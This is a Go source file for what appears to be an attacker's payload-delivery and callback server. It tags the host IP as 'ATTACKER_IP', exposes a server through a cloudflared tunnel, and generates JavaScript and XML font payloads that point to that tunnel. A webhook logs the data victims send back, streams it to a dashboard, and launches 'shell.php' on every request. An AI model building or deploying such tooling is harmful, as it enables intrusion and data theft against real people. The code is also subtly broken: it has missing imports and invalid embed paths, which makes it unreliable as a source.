package internal

import (
    "fmt"
    "io"
    "log"
    "net"
    "net/http"
    "os"
    "os/exec"
    "path/filepath"
    "time"

    "html/template"

    "github.com/gorilla/mux"
    "github.com/gorilla/websocket"
    "github.com/rs/cors"
)

// Embed payload templates directly
//go:embed ../templates/payload.js.tpl
var payloadJSTpl string

//go:embed ../templates/font-payload.xml.tpl
var fontXMLTpl string

var upgrader = websocket.Upgrader{
    CheckOrigin: func(r *http.Request) bool { return true },
}

func Run() {
    ip := detectLocalIP()
    fmt.Println("✅ Local IP detected:", ip)

    tunnelURL := startCloudflared()
    fmt.Println("🌐 Tunnel URL:", tunnelURL)

    genPayloads(tunnelURL, ip)
    fmt.Println("📦 Payloads generated at ./payloads/output")

    go startServer()
    fmt.Println("🛰️ Server + Dashboard running on http://localhost:3000")

    select {}
}

func detectLocalIP() string {
    ifaces, err := net.Interfaces()
    if err != nil {
        log.Fatal(err)
    }
    for _, iface := range ifaces {
        addrs, _ := iface.Addrs()
        for _, addr := range addrs {
            if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
                return ipnet.IP.String()
            }
        }
    }
    log.Fatal("Cannot detect local IP")
    return ""
}

func startCloudflared() string {
    cmd := exec.Command("cloudflared", "tunnel", "--url", "http://localhost:3000")
    stdout, err := cmd.StdoutPipe()
    if err != nil {
        log.Fatal(err)
    }
    cmd.Stderr = cmd.Stdout
    if err := cmd.Start(); err != nil {
        log.Fatal(err)
    }

    // Read until we get the trycloudflare URL
    buf := make([]byte, 4096)
    for {
        n, _ := stdout.Read(buf)
        out := string(buf[:n])
        if urlStart := findCFURL(out); urlStart != "" {
            return urlStart
        }
    }
}

func findCFURL(s string) string {
    // simple scan for https://*.trycloudflare.com
    for _, part := range strings.Fields(s) {
        if strings.HasPrefix(part, "https://") && strings.Contains(part, ".trycloudflare.com") {
            return part
        }
    }
    return ""
}

func genPayloads(cfURL, attackerIP string) {
    outDir := filepath.Join("payloads", "output")
    os.MkdirAll(outDir, 0755)

    data := map[string]interface{}{
        "CF_URL":      cfURL,
        "EVENT_TIME":  time.Now().Unix(),
        "ATTACKER_IP": attackerIP,
    }

    // JS payload
    jsTpl := template.Must(template.New("js").Parse(payloadJSTpl))
    jsFile, _ := os.Create(filepath.Join(outDir, "payload.js"))
    defer jsFile.Close()
    jsTpl.Execute(jsFile, data)

    // XML payload
    xmlTpl := template.Must(template.New("xml").Parse(fontXMLTpl))
    xmlFile, _ := os.Create(filepath.Join(outDir, "font-payload.xml"))
    defer xmlFile.Close()
    xmlTpl.Execute(xmlFile, data)
}

func startServer() {
    r := mux.NewRouter()
    r.HandleFunc("/webhook", webhookHandler).Methods("POST")
    r.PathPrefix("/dashboard/").Handler(http.StripPrefix("/dashboard/", http.FileServer(http.Dir("dashboard"))))
    r.HandleFunc("/ws", wsHandler)

    handler := cors.AllowAll().Handler(r)
    http.ListenAndServe(":3000", handler)
}

var clients = make(map[*websocket.Conn]bool)

func webhookHandler(w http.ResponseWriter, r *http.Request) {
    body, _ := io.ReadAll(r.Body)
    entry := fmt.Sprintf("[%s] %s → %s\n", time.Now().Format(time.RFC3339), r.RemoteAddr, string(body))
    fmt.Print("📡 Signal: ", entry)

    os.MkdirAll("logs", 0755)
    f, _ := os.OpenFile("logs/requests.log", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
    f.WriteString(entry)
    f.Close()

    for c := range clients {
        c.WriteMessage(websocket.TextMessage, []byte(entry))
    }
    exec.Command("php", "shell.php").Start()
    w.Write([]byte("OK"))
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
    conn, err := upgrader.Upgrade(w, r, nil)
    if err != nil {
        return
    }
    clients[conn] = true
}
